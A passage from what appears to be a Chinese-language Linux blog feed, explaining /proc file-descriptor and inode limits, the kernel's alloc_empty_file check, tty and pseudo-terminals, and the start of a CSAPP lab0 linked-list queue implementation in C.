class="hljs-number">10</span> -&gt; <span class="hljs-string">&#x27;socket:[477522]&#x27;</span><br></code></pre></td></tr></table></figure><h1 id="proc-sys-fs-inode-state"><a href="#proc-sys-fs-inode-state" class="headerlink" title="/proc/sys/fs/inode-state"></a>/proc/sys/fs/inode-state</h1><ul><li>第一列的值为已经分配的inode数量（nr_inodes）</li><li>第二列的值为剩余可分配的inode数量（nr_free_inodes）</li><li>第三列当nr_inodes &gt; inode-max时为非 0（preshrink）</li><li>后面三个为dummy values（总是为0）</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">$ cat /proc/sys/fs/inode-state                             <br><span class="hljs-number">139193</span>  <span class="hljs-number">25844</span>   <span class="hljs-number">0</span>       <span class="hljs-number">0</span>       <span class="hljs-number">0</span>       <span class="hljs-number">0</span>       <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h1 id="linux文件描述符与inode的关系"><a href="#linux文件描述符与inode的关系" class="headerlink" title="linux文件描述符与inode的关系"></a>linux文件描述符与inode的关系</h1><h2 id="一切皆文件"><a href="#一切皆文件" class="headerlink" title="一切皆文件"></a>一切皆文件</h2><p>在 Linux 中，一切皆文件。许多操作，比如文件打开、进程创建、管道创建、新的网络连接创建，甚至计时器创建(timerfd _ create)和事件生成(eventfd) ，都会增加 nr_files </p><p><a href="https://blog.csdn.net/weixin_43864567/article/details/124063198?spm=1001.2014.3001.5501">文件描述符与inode的关系</a></p><h2 id="file-max"><a href="#file-max" class="headerlink" title="file-max"></a>file-max</h2><p>file-max定义了系统级别的、所有进程的打开文件限制</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs vim">This <span class="hljs-keyword">file</span> defines <span class="hljs-keyword">a</span> <span class="hljs-built_in">system</span>-wide limit <span class="hljs-keyword">on</span> the <span class="hljs-keyword">number</span> of<br>              <span class="hljs-keyword">open</span> <span class="hljs-keyword">files</span> <span class="hljs-keyword">for</span> <span class="hljs-keyword">all</span> processes.  System calls that fail when<br>              encountering this limit fail with the error ENFILE.  (See<br>              also setrlimit(<span class="hljs-number">2</span>), which can <span class="hljs-keyword">be</span> used by <span class="hljs-keyword">a</span> process <span class="hljs-keyword">to</span> <span class="hljs-keyword">set</span><br>              the per-process limit, RLIMIT_NOFILE, <span class="hljs-keyword">on</span> the <span class="hljs-keyword">number</span> of<br>              <span class="hljs-keyword">files</span> it may <span class="hljs-keyword">open</span>.)  If you <span class="hljs-built_in">get</span> lots of error <span class="hljs-keyword">messages</span> in<br>              the kernel <span class="hljs-built_in">log</span> about running out of <span class="hljs-keyword">file</span> handles (<span class="hljs-keyword">open</span><br>              <span class="hljs-keyword">file</span> descriptions) (look <span class="hljs-keyword">for</span> <span class="hljs-comment">&quot;VFS: file-max limit &lt;number&gt;</span><br>              reached<span class="hljs-comment">&quot;), try increasing this value:</span><br><br>                  <span class="hljs-keyword">echo</span> <span class="hljs-number">100000</span> &gt; /proc/sys/fs/<span class="hljs-keyword">file</span>-<span class="hljs-built_in">max</span><br><br>              Privileged processes (CAP_SYS_ADMIN) can override the<br>              <span class="hljs-keyword">file</span>-<span class="hljs-built_in">max</span> limit.<br>          <br></code></pre></td></tr></table></figure><p>查看目前的file-max限制：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> cat /proc/sys/fs/file-max</span><br>394568<br></code></pre></td></tr></table></figure><h2 id="file-nr"><a href="#file-nr" class="headerlink" title="file-nr"></a>file-nr</h2><p>/proc/sys/fs/file-nr是个只读文件，三个输出分别表示已经分配的文件描述符数、已经分配但未使用的文件描述符数、文件描述符数最大值</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> cat /proc/sys/fs/file-nr</span><br>11616   0       394568<br></code></pre></td></tr></table></figure><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs tcl">/<span class="hljs-keyword">proc</span>/sys/fs/file-nr<span class="hljs-title"></span><br><span class="hljs-title">              This</span> (read-only)<span class="hljs-title"> file</span> contains<span class="hljs-title"> three</span> numbers:<span class="hljs-title"> the</span> number<span class="hljs-title"></span><br><span class="hljs-title">              of</span> allocated<span class="hljs-title"> file</span> handles (i.e.,<span class="hljs-title"> the</span> number<span class="hljs-title"> of</span> open<span class="hljs-title"> file</span><br><span class="hljs-title">              descriptions;</span> see<span class="hljs-title"> open(2));</span> the<span class="hljs-title"> number</span> of<span class="hljs-title"> free</span> file<span class="hljs-title"></span><br><span class="hljs-title">              handles;</span> and<span class="hljs-title"> the</span> maximum<span class="hljs-title"> number</span> of<span class="hljs-title"> file</span> handles (i.e.,<span class="hljs-title"> the</span><br><span class="hljs-title">              same</span> value<span class="hljs-title"> as</span> /<span class="hljs-keyword">proc</span>/sys/fs/file-max).<span class="hljs-title">  If</span> the<span class="hljs-title"> number</span> of<span class="hljs-title"></span><br><span class="hljs-title">              allocated</span> file<span class="hljs-title"> handles</span> is<span class="hljs-title"> close</span> to<span class="hljs-title"> the</span> maximum,<span class="hljs-title"> you</span> should<span class="hljs-title"></span><br><span class="hljs-title">              consider</span> increasing<span class="hljs-title"> the</span> maximum.<span class="hljs-title">  Before</span> Linux 2.6,<span class="hljs-title"> the</span><br><span class="hljs-title">              kernel</span> allocated<span class="hljs-title"> file</span> handles<span class="hljs-title"> dynamically,</span> but<span class="hljs-title"> it</span> didn&#x27;t<span class="hljs-title"></span><br><span class="hljs-title">              free</span> them<span class="hljs-title"> again.</span> <span class="hljs-title"> Instead</span> the<span class="hljs-title"> free</span> file<span class="hljs-title"> handles</span> were<span class="hljs-title"> kept</span><br><span class="hljs-title">              in</span> a<span class="hljs-title"> list</span> for<span class="hljs-title"> reallocation;</span> the &quot;free<span class="hljs-title"> file</span> handles&quot;<span class="hljs-title"> value</span><br><span class="hljs-title">              indicates</span> the<span class="hljs-title"> size</span> of<span class="hljs-title"> that</span> list.<span class="hljs-title">  A</span> large<span class="hljs-title"> number</span> of<span class="hljs-title"> free</span><br><span class="hljs-title">              file</span> handles<span class="hljs-title"> indicates</span> that<span class="hljs-title"> there</span> was<span class="hljs-title"> a</span> past<span class="hljs-title"> peak</span> in<span class="hljs-title"> the</span><br><span class="hljs-title">              usage</span> of<span class="hljs-title"> open</span> file<span class="hljs-title"> handles.</span> <span class="hljs-title"> Since</span> Linux 2.6,<span class="hljs-title"> the</span> kernel<span class="hljs-title"></span><br><span class="hljs-title">              does</span> deallocate<span class="hljs-title"> freed</span> file<span class="hljs-title"> handles,</span> and<span class="hljs-title"> the</span> &quot;free<span class="hljs-title"> file</span><br><span class="hljs-title">              handles&quot;</span> value<span class="hljs-title"> is</span> always<span class="hljs-title"> zero.</span><br></code></pre></td></tr></table></figure><h2 id="nr-open"><a href="#nr-open" class="headerlink" title="nr_open"></a>nr_open</h2><p>单个进程打开文件数的最大值</p><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs tcl">/<span class="hljs-keyword">proc</span>/sys/fs/nr_open (since<span class="hljs-title"> Linux</span> 2.6.25)<span class="hljs-title"></span><br><span class="hljs-title">              This</span> file<span class="hljs-title"> imposes</span> a<span class="hljs-title"> ceiling</span> on<span class="hljs-title"> the</span> value<span class="hljs-title"> to</span> which<span class="hljs-title"> the</span><br><span class="hljs-title">              RLIMIT_NOFILE</span> resource<span class="hljs-title"> limit</span> can<span class="hljs-title"> be</span> raised (see<span class="hljs-title"></span><br><span class="hljs-title">              getrlimit(2)).</span> <span class="hljs-title"> This</span> ceiling<span class="hljs-title"> is</span> enforced<span class="hljs-title"> for</span> both<span class="hljs-title"></span><br><span class="hljs-title">              unprivileged</span> and<span class="hljs-title"> privileged</span> process.<span class="hljs-title">  The</span> default<span class="hljs-title"> value</span> in<span class="hljs-title"></span><br><span class="hljs-title">              this</span> file<span class="hljs-title"> is</span> 1048576.  (Before<span class="hljs-title"> Linux</span> 2.6.25,<span class="hljs-title"> the</span> ceiling<span class="hljs-title"></span><br><span class="hljs-title">              for</span> RLIMIT_NOFILE<span class="hljs-title"> was</span> hard-coded<span class="hljs-title"> to</span> the<span class="hljs-title"> same</span> value.)<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> cat /proc/sys/fs/nr_open</span><br>1048576<br></code></pre></td></tr></table></figure><h2 id="函数调用链分析"><a href="#函数调用链分析" class="headerlink" title="函数调用链分析"></a>函数调用链分析</h2><ul><li>get_nr_files函数返回当前的nr_files值</li><li>alloc_empty_file在分配file结构体之前，会进行检查，判断当前nr_file值是否大于最大值files_stat.max_files</li><li>如果已经超过了最大值，那么会输出：<code>&quot;VFS: file-max limit %lu reached\n&quot;</code><br><img src="https://img-blog.csdnimg.cn/d113ec93770a4fd2841e865115e7cc8f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6YOt5ZCM5a2m5aaC5piv6K-0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></li></ul><h2 id="get-nr-files函数"><a href="#get-nr-files函数" class="headerlink" title="get_nr_files函数"></a>get_nr_files函数</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">long</span> <span class="hljs-title">get_nr_files</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>     <span class="hljs-keyword">return</span> percpu_counter_read_positive(&amp;nr_files);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="alloc-empty-file函数"><a href="#alloc-empty-file函数" class="headerlink" title="alloc_empty_file函数"></a>alloc_empty_file函数</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">struct file *<span class="hljs-title">alloc_empty_file</span><span class="hljs-params">(<span class="hljs-keyword">int</span> flags, <span class="hljs-keyword">const</span> struct cred *cred)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">long</span> old_max;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">f</span>;</span><br><br>    <span class="hljs-comment">/* Privileged users can go above max_files</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">if</span> (get_nr_files() &gt;= files_stat.max_files &amp;&amp; !capable(CAP_SYS_ADMIN)) &#123;<br>        <span class="hljs-comment">/* percpu_counters are inaccurate.  Do an expensive check before we go and fail. */</span><br>        <span class="hljs-keyword">if</span> (percpu_counter_sum_positive(&amp;nr_files) &gt;= files_stat.max_files)<br>            <span class="hljs-keyword">goto</span> over;<br>    &#125;<br>    f = __alloc_file(flags, cred);<br>    <span class="hljs-keyword">if</span> (!IS_ERR(f)) percpu_counter_inc(&amp;nr_files);<br><br>    <span class="hljs-keyword">return</span> f;<br><br>over:<br>    <span class="hljs-comment">/* Ran out of filps - report that */</span><br>    <span class="hljs-keyword">if</span> (get_nr_files() &gt; old_max) &#123;<br>        pr_info(<span class="hljs-string">&quot;VFS: file-max limit %lu reached\n&quot;</span>, get_max_files());<br>        old_max = get_nr_files();<br>    &#125;<br>    <span class="hljs-keyword">return</span> ERR_PTR(-ENFILE);<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Linux tty&amp;pty</title>
    <link href="/p/f2031cbb/"/>
    <url>/p/f2031cbb/</url>
    
    <content type="html"><![CDATA[<h1 id="TTY的历史"><a href="#TTY的历史" class="headerlink" title="TTY的历史"></a>TTY的历史</h1><p>TTY全称<code>TeleTYpewriter</code>，也即是电传打字机，它通过两根电缆连接计算机，一根用于向计算机发送指令，一根用于接收计算机的输出，输出结果是打印在纸上的</p><p>由于历史原因， Linux保留了TTY，上述的<strong>输入和输出</strong>两个电缆，可以简单的认为是<strong>键盘输入和显卡输出</strong></p><p><img src="https://img-blog.csdnimg.cn/1842af912af64a9dbe89704d49e775a5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6YOt5ZCM5a2m5aaC5piv6K-0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><h1 id="tty和stty命令"><a href="#tty和stty命令" class="headerlink" title="tty和stty命令"></a>tty和stty命令</h1><p>tty命令返回当前的终端名字，1表示可以通过Ctrl+Alt+F3得到</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">$ tty<br>/dev/pts/<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>stty是对tty进行设置的命令，s表示set</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs gams">- <span class="hljs-keyword">Display</span> <span class="hljs-keyword">all</span> settings <span class="hljs-keyword">for</span> the current terminal:<br>  stty -a<br><br>- <span class="hljs-keyword">Set</span> the <span class="hljs-comment">number of rows:</span><br>  stty <span class="hljs-comment">rows rows</span><br><br>- <span class="hljs-keyword">Set</span> <span class="hljs-comment">the number of columns:</span><br>  stty <span class="hljs-comment">cols cols</span><br><br>- Get <span class="hljs-comment">the actual transfer speed of a device:</span><br>  stty <span class="hljs-comment">-F path</span>/to/<span class="hljs-comment">device_file speed</span><br><br>- Reset <span class="hljs-comment">all modes to reasonable values for the current terminal:</span><br>  stty <span class="hljs-comment">sane</span><br><br></code></pre></td></tr></table></figure><p>列出当前tty的所有配置信息：</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs nix">$ stty -a<br>speed <span class="hljs-number">9600</span> baud; rows <span class="hljs-number">35</span>; columns <span class="hljs-number">129</span>; <span class="hljs-attr">line</span> = <span class="hljs-number">0</span>;<br><span class="hljs-attr">intr</span> = ^C; <span class="hljs-attr">quit</span> = ^\; <span class="hljs-attr">erase</span> = ^?; <span class="hljs-attr">kill</span> = ^U; <span class="hljs-attr">eof</span> = ^D; <span class="hljs-attr">eol</span> = &lt;undef&gt;; <span class="hljs-attr">eol2</span> = &lt;undef&gt;; <span class="hljs-attr">swtch</span> = &lt;undef&gt;; <span class="hljs-attr">start</span> = ^Q; <span class="hljs-attr">stop</span> = ^S;<br><span class="hljs-attr">susp</span> = ^Z; <span class="hljs-attr">rprnt</span> = ^R; <span class="hljs-attr">werase</span> = ^W; <span class="hljs-attr">lnext</span> = ^V; <span class="hljs-attr">discard</span> = ^O; <span class="hljs-attr">min</span> = <span class="hljs-number">1</span>; <span class="hljs-attr">time</span> = <span class="hljs-number">0</span>;<br>-parenb -parodd -cmspar cs8 -hupcl -cstopb cread -clocal -crtscts<br>-ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl ixon -ixoff -iuclc -ixany -imaxbel -iutf8<br>opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0<br>isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl echoke -flusho -extproc<br></code></pre></td></tr></table></figure><h1 id="切换tty"><a href="#切换tty" class="headerlink" title="切换tty"></a>切换tty</h1><p>Ctrl+Alt+F1可以切换到第一个tty，以此类推</p><p>这里把字符串输入到tty2，由于现在处于pts1，因此终端没有显示，当切换到tty2就会显示字符串</p><p><img src="https://img-blog.csdnimg.cn/14ddcea701fe49c881e128b27d51b178.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6YOt5ZCM5a2m5aaC5piv6K-0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>这里切换到了tty4<br><img src="https://img-blog.csdnimg.cn/fdeb641bc1284013aa86a0fc3040f3eb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6YOt5ZCM5a2m5aaC5piv6K-0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><h1 id="伪终端：pseudo-terminal"><a href="#伪终端：pseudo-terminal" class="headerlink" title="伪终端：pseudo terminal"></a>伪终端：pseudo terminal</h1><ul><li>终端模拟器(terminal emulator) ，是运行在内核的模块</li><li>用户态的终端模拟程序，被称为伪终端（pseudo terminal, PTY）</li></ul><p>可以通过打开文件 /dev/ptmx 创建伪终端，伪终端 pty 具有以下两种用途：</p><ul><li>使用 telnet、 ssh 命令支持远程登录</li><li>提供窗口系统用以创建命令解释程序窗口的界面</li></ul><h1 id="pty最大配额"><a href="#pty最大配额" class="headerlink" title="pty最大配额"></a>pty最大配额</h1><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>pty/max<br>              <span class="hljs-keyword">This</span> <span class="hljs-keyword">file</span> defines the maximum number of pseudoterminals.<br><br>       <span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>pty/nr<br>              <span class="hljs-keyword">This</span> <span class="hljs-keyword">read</span>-only <span class="hljs-keyword">file</span> indicates how many pseudoterminals are<br>              currently in use.<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/c1e2fda7aa8b4054997f8f4d0f04de88.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6YOt5ZCM5a2m5aaC5piv6K-0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP-lab0：C Programming Lab</title>
    <link href="/p/3b50ff2c/"/>
    <url>/p/3b50ff2c/</url>
    
    <content type="html"><![CDATA[<h1 id="队列的链表实现"><a href="#队列的链表实现" class="headerlink" title="队列的链表实现"></a>队列的链表实现</h1><p>用一个结构体来表示链表，定义如下：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * @brief Pointer to the first element in the queue, or NULL if the</span><br><span class="hljs-comment">     *        queue is empty.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">list_ele_t</span> *head;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * <span class="hljs-doctag">TODO:</span> You will need to add more fields to this structure</span><br><span class="hljs-comment">     *       to efficiently implement q_size and q_insert_tail</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">list_ele_t</span> *tail;<br>    <span class="hljs-keyword">int</span> size;<br>&#125; <span class="hljs-keyword">queue_t</span>;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * @brief Linked list element containing a string.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * You shouldn&#x27;t change this struct.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_ele</span> &#123;</span><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * @brief Pointer to a char array containing a string value.</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * The memory for this string should be explicitly allocated and freed</span><br><span class="hljs-comment">     * whenever an element is inserted and removed from the queue.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">char</span> *value;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * @brief Pointer to the next element in the linked list.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_ele</span> *<span class="hljs-title">next</span>;</span><br>&#125; <span class="hljs-keyword">list_ele_t</span>;<br></code></pre></td></tr></table></figure><ul><li>queue_t结构体中head、tail分别是指向list_ele_t类型的指针</li><li>list_ele结构体中包含两个指针，分别指向char和list_ele类型</li><li>队列的数据结构如下所示：</li></ul><p><img src="/image/csapp/Snipaste_2022-08-27_12-10-43.png"></p><h1 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h1><p>完成以下函数并通过评测系统：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-comment">/* Create empty queue. */</span><br>queue_t *queue<span class="hljs-constructor">_new(<span class="hljs-params">void</span>)</span>;<br><br><span class="hljs-comment">/* Free ALL storage used by queue. */</span><br>void queue<span class="hljs-constructor">_free(<span class="hljs-params">queue_t</span> <span class="hljs-operator">*</span><span class="hljs-params">q</span>)</span>;<br><br><span class="hljs-comment">/* Attempt to insert element at head of queue. */</span><br><span class="hljs-built_in">bool</span> queue<span class="hljs-constructor">_insert_head(<span class="hljs-params">queue_t</span> <span class="hljs-operator">*</span><span class="hljs-params">q</span>, <span class="hljs-params">const</span> <span class="hljs-params">char</span> <span class="hljs-operator">*</span><span class="hljs-params">s</span>)</span>;<br><br><span class="hljs-comment">/* Attempt to insert element at tail of queue. */</span><br><span class="hljs-built_in">bool</span> queue<span class="hljs-constructor">_insert_tail(<span class="hljs-params">queue_t</span> <span class="hljs-operator">*</span><span class="hljs-params">q</span>, <span class="hljs-params">const</span> <span class="hljs-params">char</span> <span class="hljs-operator">*</span><span class="hljs-params">s</span>)</span>;<br><br><span class="hljs-comment">/* Attempt to remove element from head of queue. */</span><br><span class="hljs-built_in">bool</span> queue<span class="hljs-constructor">_remove_head(<span class="hljs-params">queue_t</span> <span class="hljs-operator">*</span><span class="hljs-params">q</span>, <span class="hljs-params">char</span> <span class="hljs-operator">*</span><span class="hljs-params">sp</span>, <span class="hljs-params">size_t</span> <span class="hljs-params">bufsize</span>)</span>;<br><br><span class="hljs-comment">/* Return number of elements in queue. */</span><br>size_t queue<span class="hljs-constructor">_size(<span class="hljs-params">queue_t</span> <span class="hljs-operator">*</span><span class="hljs-params">q</span>)</span>;<br><br><span class="hljs-comment">/* Reverse elements in queue */</span><br>void queue<span class="hljs-constructor">_reverse(<span class="hljs-params">queue_t</span> <span class="hljs-operator">*</span><span class="hljs-params">q</span>)</span>;<br></code></pre></td></tr></table></figure><h1 id="queue-new"><a href="#queue-new" class="headerlink" title="queue_new"></a>queue_new</h1><ul><li>使用malloc在堆上给queue_t分配内存</li><li>将head和tail指针、size初始化<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * @brief Allocates a new queue</span><br><span class="hljs-comment"> * @return The new queue, or NULL if memory allocation failed</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">queue_t</span> *<span class="hljs-title">queue_new</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;<br>    <span class="hljs-comment">// malloc:success return pointer to addr ; error return NULL</span><br>    <span class="hljs-keyword">queue_t</span> *q = <span class="hljs-built_in">malloc</span>(<span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(<span class="hljs-keyword">queue_t</span>));<br>    <span class="hljs-comment">/* What if malloc returned NULL? */</span><br>    <span class="hljs-keyword">if</span> (q != <span class="hljs-literal">NULL</span>) &#123;<br>        q-&gt;head = <span class="hljs-literal">NULL</span>;<br>        q-&gt;tail = <span class="hljs-literal">NULL</span>;<br>        q-&gt;size = <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> q;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h1 id="queue-free"><a href="#queue-free" class="headerlink" title="queue_free"></a>queue_free</h1><ul><li>使用free函数释放内存，注意到q-&gt;head-&gt;value和q-&gt;head都应该被free，如果只free了q-&gt;head-&gt;value会报内存泄露</li></ul><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xl">void queue_free(queue_t *q) &#123;<br>    <span class="hljs-comment">/* How about freeing the list elements and the strings? */</span><br>    <span class="hljs-comment">/* Free queue structure */</span><br>    <span class="hljs-keyword">if</span> (q != NULL) &#123;<br>        <span class="hljs-function"><span class="hljs-title">while</span> (q-&gt;</span>size) &#123;<br>            <span class="hljs-function"><span class="hljs-title">list_ele_t</span> *temp = q-&gt;</span><span class="hljs-function"><span class="hljs-title">head</span>-&gt;</span>next;<br>            <span class="hljs-function"><span class="hljs-title">free</span>(q-&gt;</span><span class="hljs-function"><span class="hljs-title">head</span>-&gt;</span>value);<br>            <span class="hljs-function"><span class="hljs-title">free</span>(q-&gt;</span>head);<br>            <span class="hljs-function"><span class="hljs-title">q</span>-&gt;</span>head = temp;<br>            <span class="hljs-function"><span class="hljs-title">q</span>-&gt;</span>size--;<br>        &#125;<br>    &#125;<br>    free(q);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="queue-insert-head"><a href="#queue-insert-head" class="headerlink" title="queue_insert_head"></a>queue_insert_head</h1><ul><li>在头部插入节点</li><li>使用malloc为新节点和新节点中的字符串分配空间，注意<code>sizeof(char) * (strlen(s) + 1)</code>语句</li><li>除了给节点、节点内的字符串分配空间外，不可以分配别的空间<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 